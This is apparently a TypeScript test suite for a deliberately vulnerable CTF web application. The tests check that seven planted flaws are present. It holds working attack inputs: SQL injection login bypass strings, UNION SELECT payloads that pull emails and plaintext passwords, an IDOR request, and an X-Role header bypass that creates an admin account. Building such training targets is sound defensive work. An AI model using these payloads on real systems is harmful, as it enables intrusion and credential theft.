/**
 * CTF Security Test Suite
 *
 * These tests VERIFY that vulnerabilities EXIST (setup validation).
 * All tests should PASS — a passing test means the vulnerability is present.
 *
 * After defenders apply fixes, these tests will FAIL, confirming the fix.
 *
 * Run: bun test
 */

import { describe, it, expect, beforeAll, afterAll } from "bun:test";
import { Database } from "bun:sqlite";

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

const BASE = "http://localhost:4000";

async function api(
  method: string,
  path: string,
  opts: { body?: object; headers?: Record<string, string> } = {}
): Promise<{ status: number; data: unknown }> {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: {
      "Content-Type": "application/json",
      ...(opts.headers ?? {}),
    },
    body: opts.body ? JSON.stringify(opts.body) : undefined,
  });
  let data: unknown;
  try { data = await res.json(); } catch { data = await res.text(); }
  return { status: res.status, data };
}

// ---------------------------------------------------------------------------
// Setup: get a valid token for a regular user
// ---------------------------------------------------------------------------

let regularToken = "";
let regularUserId = 0;

beforeAll(async () => {
  // Ensure server is reachable
  try {
    await fetch(BASE);
  } catch {
    throw new Error("Server not running. Start it with: bun run src/index.ts");
  }

  // Login as a known regular user
  const res = await api("POST", "/api/auth/login", {
    body: { email: "carlos@empresa.com", password: "Senha123" },
  });

  expect(res.status).toBe(200);
  const d = res.data as { token: string; user: { id: number } };
  regularToken  = d.token;
  regularUserId = d.user.id;
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("VULN 1 — SQL Injection in login", () => {
  it("should bypass auth with classic OR payload", async () => {
    const res = await api("POST", "/api/auth/login", {
      body: {
        email:    "' OR '1'='1' --",
        password: "anything",
      },
    });

    expect(res.status).toBe(200);
    const d = res.data as { token: string; user: { role: string } };
    expect(d.token).toBeTruthy();
    expect(d.user.role).toBe("admin");
  });

  it("should bypass auth with email-only OR injection", async () => {
    const res = await api("POST", "/api/auth/login", {
      body: {
        email:    "' OR 1=1--",
        password: "",
      },
    });
    expect(res.status).toBe(200);
    const d = res.data as { token?: string };
    expect(d.token).toBeTruthy();
  });

  it("should trigger verbose SQL error with malformed injection", async () => {
    const res = await api("POST", "/api/auth/login", {
      body: {
        email:    "' INVALID SYNTAX---",
        password: "x",
      },
    });
    const d = res.data as { error?: string; message?: string; query?: string };
    if (res.status === 500) {
      expect(d.message).toBeTruthy();
      expect(d.query).toContain("SELECT * FROM users WHERE email");
    }
    // If the DB silently returns nothing that's also acceptable for this test
    expect([200, 401, 500]).toContain(res.status);
  });
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("VULN 2 — SQL Injection in product search (UNION)", () => {
  it("should exfiltrate user data via UNION SELECT", async () => {
    // The products table has 6 selected columns; users has compatible types
    const payload = encodeURIComponent(
      "' UNION SELECT id,email,password,role,nome,created_at FROM users--"
    );
    const res = await fetch(`${BASE}/api/products/search?q=${payload}`);
    const data = await res.json() as { results: Array<Record<string, unknown>> };

    expect(res.status).toBe(200);
    const hasUserData = data.results.some(
      (row) => String(row.descricao ?? row.nome ?? "").includes("@empresa.com") ||
               String(row.nome     ?? "").includes("@empresa.com")
    );
    expect(hasUserData).toBe(true);
  });

  it("should return verbose SQL error on invalid injection", async () => {
    const payload = encodeURIComponent("' UNION SELECT 1--");
    const res  = await fetch(`${BASE}/api/products/search?q=${payload}`);
    const data = await res.json() as { error?: string; query?: string };
    // Either a 500 with query details or a 200 — both acceptable
    if (res.status === 500) {
      expect(data.query).toContain("SELECT");
    }
    expect([200, 500]).toContain(res.status);
  });
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("VULN 3 — IDOR: access any user's data with valid JWT", () => {
  it("should return user 1 (admin) data when authenticated as any user", async () => {
    const res = await api("GET", "/api/users/1", {
      headers: { Authorization: `Bearer ${regularToken}` },
    });

    expect(res.status).toBe(200);
    const d = res.data as { email: string; role: string };
    expect(d.email).toBe("admin@empresa.com");
    expect(d.role).toBe("admin");
  });

  it("should return plaintext password in IDOR response (VULN 3+4)", async () => {
    const res = await api("GET", "/api/users/1", {
      headers: { Authorization: `Bearer ${regularToken}` },
    });

    expect(res.status).toBe(200);
    const d = res.data as { password: string };
    expect(d.password).toBe("Admin@2024!");
  });

  it("should allow accessing own profile data", async () => {
    const res = await api("GET", `/api/users/${regularUserId}`, {
      headers: { Authorization: `Bearer ${regularToken}` },
    });
    expect(res.status).toBe(200);
  });
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("VULN 4 — Plaintext passwords stored in DB", () => {
  it("should expose plaintext password via IDOR endpoint", async () => {
    const res = await api("GET", "/api/users/1", {
      headers: { Authorization: `Bearer ${regularToken}` },
    });
    const d = res.data as { password: string };
    expect(d.password).not.toMatch(/^\$2[aby]\$|^\$argon2/);
    expect(d.password).toBe("Admin@2024!");
  });

  it("should expose plaintext password via SQL injection", async () => {
    const payload = encodeURIComponent(
      "' UNION SELECT id,email,password,role,nome,created_at FROM users WHERE role='admin'--"
    );
    const res  = await fetch(`${BASE}/api/products/search?q=${payload}`);
    const data = await res.json() as { results: Array<Record<string, unknown>> };

    if (res.status === 200 && data.results.length > 0) {
      const adminRow = data.results.find(
        (r) => String(r.nome ?? r.descricao ?? "").includes("admin") ||
               String(r.descricao ?? r.nome ?? "").includes("@empresa.com")
      );
      if (adminRow) {
        const passwordField = String(adminRow.descricao ?? adminRow.preco ?? "");
        expect(passwordField).not.toMatch(/^\$2[aby]\$|^\$argon2/);
      }
    }
    expect([200, 500]).toContain(res.status);
  });
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("VULN 5 — Broken access control: X-Role header bypass", () => {
  it("should grant admin access with X-Role: admin header (no JWT)", async () => {
    const res = await api("GET", "/api/admin/users", {
      headers: { "X-Role": "admin" },
      // No Authorization header
    });

    expect(res.status).toBe(200);
    const d = res.data as { users: Array<{ role: string }> };
    expect(Array.isArray(d.users)).toBe(true);
    expect(d.users.length).toBeGreaterThan(0);
    const admin = d.users.find((u) => u.role === "admin");
    expect(admin).toBeDefined();
  });

  it("should reject request without X-Role header", async () => {
    const res = await api("GET", "/api/admin/users");
    expect(res.status).toBe(403);
  });

  it("should allow creating admin user via header bypass", async () => {
    const randomEmail = `hacker_${Date.now()}@evil.com`;
    const res = await api("POST", "/api/admin/users", {
      headers: { "X-Role": "admin" },
      body: {
        nome:     "Evil Attacker",
        email:    randomEmail,
        password: "h4cked!",
        role:     "admin",
      },
    });

    expect(res.status).toBe(201);
    const d = res.data as { user: { role: string } };
    expect(d.user.role).toBe("admin");

    // Clean up
    await api("GET", "/api/admin/users", { headers: { "X-Role": "admin" } });
  });
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("VULN 6 — Public /api/logs endpoint", () => {
  it("should return logs without any authentication", async () => {
    const res = await api("GET", "/api/logs");
    // No Authorization header
    expect(res.status).toBe(200);
    const d = res.data as { logs: unknown[] };
    expect(Array.isArray(d.logs)).toBe(true);
  });

  it("should include request bodies (potentially with passwords)", async () => {
    // Trigger a login to create a log entry
    await api("POST", "/api/auth/login", {
      body: { email: "carlos@empresa.com", password: "Senha123" },
    });

    const res = await api("GET", "/api/logs");
    const d   = res.data as { logs: Array<{ body: string; path: string }> };

    const loginLog = d.logs.find(
      (l) => l.path === "/api/auth/login" && (l.body ?? "").includes("Senha123")
    );
    expect(loginLog).toBeDefined();
    expect(loginLog?.body).toContain("Senha123");
  });

  it("should include sql_query column exposing DB schema", async () => {
    const res = await api("GET", "/api/logs");
    const d   = res.data as { logs: Array<{ sql_query: string }> };

    const sqlLog = d.logs.find(
      (l) => (l.sql_query ?? "").toUpperCase().includes("SELECT")
    );
    expect(sqlLog).toBeDefined();
    expect(sqlLog?.sql_query).toContain("FROM");
  });
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("VULN 7 — Verbose SQL error messages", () => {
  it("should return SQL query in error response for product search", async () => {
    // Force a column-count mismatch to trigger an error
    const payload = encodeURIComponent("' UNION SELECT 1,2--");
    const res  = await fetch(`${BASE}/api/products/search?q=${payload}`);
    const data = await res.json() as { query?: string; message?: string };

    if (res.status === 500) {
      expect(data.query ?? data.message).toBeTruthy();
      const combined = (data.query ?? "") + " " + (data.message ?? "");
      expect(combined.length).toBeGreaterThan(10);
    }
    // 200 with results also shows the vuln worked (no error was triggered)
    expect([200, 500]).toContain(res.status);
  });

  it("should expose error details for login SQL syntax errors", async () => {
    const res = await api("POST", "/api/auth/login", {
      body: { email: "test@test.com'", password: "x'" },
    });
    if (res.status === 500) {
      const d = res.data as { message?: string; query?: string };
      expect(d.message).toBeTruthy();
      expect(d.query).toContain("SELECT * FROM users");
    }
    expect([200, 401, 500]).toContain(res.status);
  });
});

// ---------------------------------------------------------------------------
// Meta-test: confirm the API is actually vulnerable (summary)
// ---------------------------------------------------------------------------

describe("CTF Setup validation", () => {
  it("should confirm all 7 vulnerability categories are reachable", async () => {
    // 1. SQL injection endpoint exists
    const loginRes = await api("POST", "/api/auth/login", {
      body: { email: "x", password: "x" },
    });
    expect([200, 401, 500]).toContain(loginRes.status);

    // 2. Product search endpoint exists
    const searchRes = await fetch(`${BASE}/api/products/search?q=notebook`);
    expect(searchRes.status).toBe(200);

    // 3+4. User endpoint returns data
    const userRes = await api("GET", "/api/users/1", {
      headers: { Authorization: `Bearer ${regularToken}` },
    });
    expect(userRes.status).toBe(200);

    // 5. Admin endpoint accessible via header
    const adminRes = await api("GET", "/api/admin/users", {
      headers: { "X-Role": "admin" },
    });
    expect(adminRes.status).toBe(200);

    // 6. Logs accessible without auth
    const logsRes = await api("GET", "/api/logs");
    expect(logsRes.status).toBe(200);

    console.log("\n✅ All vulnerability endpoints are reachable and functional.\n");
  });
});
